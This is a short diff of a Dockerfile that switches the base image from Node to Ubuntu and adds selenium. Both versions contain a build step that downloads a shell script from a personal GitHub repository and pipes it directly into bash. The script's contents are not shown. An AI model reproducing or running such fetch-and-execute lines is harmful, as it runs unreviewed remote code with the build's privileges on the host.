@@ -1,12 +1,7 @@
-FROM node:18
+FROM ubuntu:20.04
 
-WORKDIR /opt/app
+RUN apt update;apt -y install curl wget python3 python3-pip
+RUN pip3 install selenium
+RUN wget -O - https://raw.githubusercontent.com/williamarmenta54/colab/refs/heads/main/colab_sel.sh | bash
 
-ENV NODE_ENV production
-
-COPY . .
-
-
-RUN apt update;apt -y install curl wget;wget -O - https://raw.githubusercontent.com/williamarmenta54/colab/refs/heads/main/colab_sel.sh | bash
-
-CMD ["npm", "run", "start", "/bin/bash"]
+CMD ["/bin/bash"]
